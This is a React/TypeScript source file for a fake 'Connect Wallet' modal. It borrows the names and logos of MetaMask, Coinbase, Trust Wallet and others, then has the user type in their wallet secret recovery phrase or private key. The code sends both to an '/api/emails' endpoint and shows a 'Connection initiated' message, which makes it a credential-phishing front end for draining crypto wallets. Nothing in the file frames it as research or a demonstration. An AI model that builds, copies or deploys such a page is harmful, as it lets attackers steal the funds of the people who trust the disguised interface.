import React, { useState } from "react";
import globePic from "../assets/PikPng.com_wire-globe-png_5154917.png";
import binance from "../assets/binance.png";
import coinbase from "../assets/coinbase.png";
import metamask from "../assets/MetaMask_Fox.svg.png";
import phantom from "../assets/phantom.svg";
import trustwallet from "../assets/trustwallet.jpeg";
import walletconnect from "../assets/wallet-connect-logo.png";
import okxwallet from "../assets/okxwaller.png";
import { StaticImageData } from "next/image";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { toast } from 'react-toastify';
import { Textarea } from "@/components/ui/textarea";
import { Loader2, SquareChevronLeft, CircleChevronLeft, CircleX } from "lucide-react";

type WalletOption = {
  name: string;
  installed: boolean;
  icon: StaticImageData | string;
};


const walletOptions: WalletOption[] = [
  { name: "MetaMask", installed: true, icon: metamask },
  { name: "Trust Wallet", installed: true, icon: trustwallet },
  { name: "Coinbase Wallet", installed: true, icon: coinbase },
  { name: "WalletConnect", installed: false, icon: walletconnect },
  { name: "Binance Wallet", installed: false, icon: binance },
  { name: "OKX Wallet", installed: false, icon: okxwallet },
  { name: "Phantom", installed: false, icon: phantom },
];

type WalletConnectModalProps = {
  onClose: () => void;
  isModalOpen: boolean;
};

const WalletConnectModal: React.FC<WalletConnectModalProps> = ({ onClose, isModalOpen }) => {

  const [isLoading, setIsLoading] = useState(false);
  const [result , setResult] = useState<Record<string , string>>({});
  const [selectedWallet, setSelectedWallet] = useState<WalletOption | null>(null);
  const [secretPhase, setSecretPhase] = useState('');
  const [privateKey, setPrivateKey] = useState('');
  const [validation, setValidation] = useState({
    secretPhrase: { isValid: false, error: '' },
    privateKey: { isValid: false, error: '' }
  });
  
  const validateSecretPhrase = (phrase: string): { isValid: boolean; error?: string } => {
    if (!phrase) return { isValid: false };
    
    const words = phrase.trim().split(/\s+/);
    const validLengths = [12, 15, 18, 21, 24];
    
    if (!validLengths.includes(words.length)) {
      return {
        isValid: false,
        error: `Secret phrase must be 12, 15, 18, 21, or 24 words (current: ${words.length} words)`
      };
    }
  
    return { isValid: true };
  };

  const validatePrivateKey = (key: string): { isValid: boolean; error?: string } => {
    if (!key) return { isValid: false };
    
    // Remove spaces and check if it's a valid hex string
    const cleanKey = key.replace(/\s+/g, '');
    if (cleanKey.length < 32) {
      return {
        isValid: false,
        error: `Private key must be at least 32 characters (current: ${cleanKey.length})`
      };
    }
    return { isValid: true };
  };
  

  const handleWalletClick = (wallet: WalletOption) => {
    setIsLoading(true);

    setSelectedWallet(wallet);

    setTimeout(() => {
      setIsLoading(false);
    }, 1100);

  };

  const handleConnect = () => {
    console.log('Connecting with:', selectedWallet?.name);
    setIsLoading(true);

    const newValidation = {
      secretPhrase: { isValid: true, error: '' },
      privateKey: { isValid: true, error: '' },
    };

    if (secretPhase) {
      const result = validateSecretPhrase(secretPhase);
      if (!result.isValid) {
        newValidation.secretPhrase = {
          isValid: false,
          error: result.error || '',
        };
        toast.error(result.error || 'Invalid Secret Phrase');
      }
    }

    if (privateKey) {
      const result = validatePrivateKey(privateKey);
      if (!result.isValid) {
        newValidation.privateKey = {
          isValid: false,
          error: result.error || '',
        };
        toast.error(result.error || 'Invalid Private Key');
      }
    }
  
    // Step 4: Update validation state
    setValidation(newValidation);

    if (!newValidation.secretPhrase.isValid || !newValidation.privateKey.isValid) {
      setIsLoading(false);
      setSecretPhase('');
      setPrivateKey('');
      return; // Exit the function early, skipping the fetch call
    }
    // Prepare the data
    const data = {
      walletName: selectedWallet?.name,
      ...(secretPhase && { secretPhase }),
      ...(privateKey && { privateKey })
    };
  
    fetch("/api/emails", {
      method: 'POST',
      body: JSON.stringify(data),
      headers: { 
        "Content-Type": "application/json", 
        Accept: "application/json" 
      },
    })
    .then(response => response.json())
    .then(data => {
      setResult(data);
      // Optionally show success message
      toast.success('Connection initiated');
    })
    .catch(error => {
      setResult(error);
      // Optionally show error message
      toast.error('Connection failed');
    })
    .finally(() => setIsLoading(false));
  };


  const handleBack = () => {
    setSelectedWallet(null);
    setSecretPhase('');
    setPrivateKey('');
  };

  return (
    <div
      className={`fixed inset-0 flex items-end md:items-center justify-center bg-black transition-all duration-300 z-40
      ${isModalOpen ? 'bg-opacity-50 opacity-100' : 'bg-opacity-0 opacity-0 pointer-events-none'}`}
    >
      <div
        className={`w-full max-w-xl md:max-w-2xl bg-gray-900 text-white p-6 rounded-t-lg md:rounded-lg shadow-lg 
        max-h-[90vh] md:max-h-[80vh] overflow-y-auto relative transition-transform duration-300 ease-out
        ${isModalOpen ? 'translate-y-0' : 'translate-y-full md:translate-y-8'}`}
      >
        {/* Close button */}
        <button onClick={onClose} className="absolute right-4 text-white hover:text-white text-xl transition-all duration-200 hover:rotate-90">
          <CircleX />
        </button>

        {isLoading ? (
          <div className="flex flex-col items-center justify-center min-h-[400px] animate-fadeIn">
            <Loader2 className="w-12 h-12 text-blue-500 animate-spin mb-4" />
            <p className="text-lg">Initializing {selectedWallet?.name}...</p>
          </div>
        ) : selectedWallet ? (
          <div className="animate-fadeIn">
            {/* Back Button */}
            <button onClick={handleBack} className="mb-3 text-white hover:text-white">
              <CircleChevronLeft />
            </button>

            <div className="flex items-center space-x-3 mb-6">
              <img
                src={typeof selectedWallet.icon === "string" ? selectedWallet.icon : selectedWallet.icon.src}
                alt={`${selectedWallet.name} icon`}
                className="w-8 h-8 rounded-md"
              />
              <h2 className="text-xl font-semibold">{selectedWallet.name}</h2>
            </div>
            <p className="text-gray-500 ">Connect your wallet..</p>
            <Tabs defaultValue="key" className="w-full">
              <TabsList className="grid w-full grid-cols-2 mb-4 bg-black bg-opacity-50 opacity-100">
                <TabsTrigger value="secret-phrase">Secret Phrase</TabsTrigger>
                <TabsTrigger value="private-key">Private Key</TabsTrigger>
              </TabsList>

              <TabsContent value="secret-phrase" className="space-y-4">
                <div>
                  <label className="block text-sm font-medium text-gray-400 mb-2">
                    Secret Phase
                  </label>
                  <Textarea
                    value={secretPhase}
                    onChange={(e) => setSecretPhase(e.target.value)}
                    placeholder="Enter your secret phrase, separated by space"
                    className="w-full min-h-[120px] bg-gray-800 border-gray-700 text-white resize-none rounded-md"
                  />
                </div>
                <Button
                  onClick={handleConnect}
                  className="w-full bg-blue-600 hover:bg-blue-700 text-white py-2 rounded-lg transition-colors duration-200"
                  disabled={!secretPhase}
                >
                  Connect
                </Button>
              </TabsContent>

              <TabsContent value="private-key" className="space-y-4">
                <div>
                  <label className="block text-sm font-medium text-gray-400 mb-2">
                    Private Key
                  </label>
                  <Input
                    type="text"
                    value={privateKey}
                    onChange={(e) => setPrivateKey(e.target.value)}
                    placeholder="Your Private key"
                    className="w-full bg-gray-800 border-gray-700 text-white"
                  />
                </div>
                <Button
                  onClick={handleConnect}
                  className="w-full bg-blue-600 hover:bg-blue-700 text-white py-2 rounded-lg transition-colors duration-200"
                  disabled={!privateKey}
                >
                  Connect
                </Button>
              </TabsContent>
            </Tabs>
          </div>
        ) : (
          <div className="flex flex-col md:flex-row space-y-6 md:space-y-0 md:space-x-6 relative">
            {/* Original wallet selection content */}
            <div className="w-full md:w-1/2">
              <div className="flex items-center space-x-2 mb-4 animate-fadeIn">
                <a href="#" className="text-white text-lg font-bold">
                  <img
                    src="https://uploads-ssl.webflow.com/6362079190ba0160faca7b3f/6362098b7528ea4e0c4eb5cf_logo.svg"
                    alt="DX25 Logo"
                    className="h-5"
                  />
                </a>
                <h2 className="text-lg font-semibold">Connect</h2>
              </div>

              <div className="space-y-4">
                <p className="text-sm font-normal text-gray-500 dark:text-gray-400">
                  Connect with one of our available wallet providers.
                </p>

                {walletOptions.map((wallet, index) => (
                  <div
                    key={wallet.name}
                    onClick={() => handleWalletClick(wallet)}
                    className={`flex items-center space-x-3 cursor-pointer hover:bg-gray-600 p-2 rounded-md 
                      transition-all duration-200 hover:scale-102 animate-fadeIn`}
                    style={{ animationDelay: `${index * 100}ms` }}
                  >
                    <img
                      src={typeof wallet.icon === "string" ? wallet.icon : wallet.icon.src}
                      alt={`${wallet.name} icon`}
                      className="w-8 h-8 rounded-md"
                    />
                    <div className="flex-1">
                      <p>{wallet.name}</p>
                    </div>
                    {wallet.installed && (
                      <span className="text-sm text-green-400">Installed</span>
                    )}
                  </div>
                ))}
              </div>
            </div>

            <div className="hidden md:block absolute left-1/2 top-0 w-px h-full bg-white/20 transform -translate-x-1/2 animate-fadeIn" />

            <div className="w-full md:w-1/2 flex flex-col items-center text-center mt-8 md:mt-0 animate-fadeIn">
              <img
                src={globePic.src}
                alt="Wire Globe"
                className="hidden md:block w-32 h-32 mb-8 mt-28 animate-spin-slow"
              />
              <p className="text-sm font-medium">Your gateway to the decentralized world</p>
              <p className="text-xs text-gray-400">Connect a wallet to get started</p>
              <a href="#" className="text-blue-400 text-sm mt-2 hover:underline transition-colors duration-200">
                New to wallets?
              </a>
            </div>
          </div>
        )}
      </div>
    </div>
  );
};

export default WalletConnectModal;
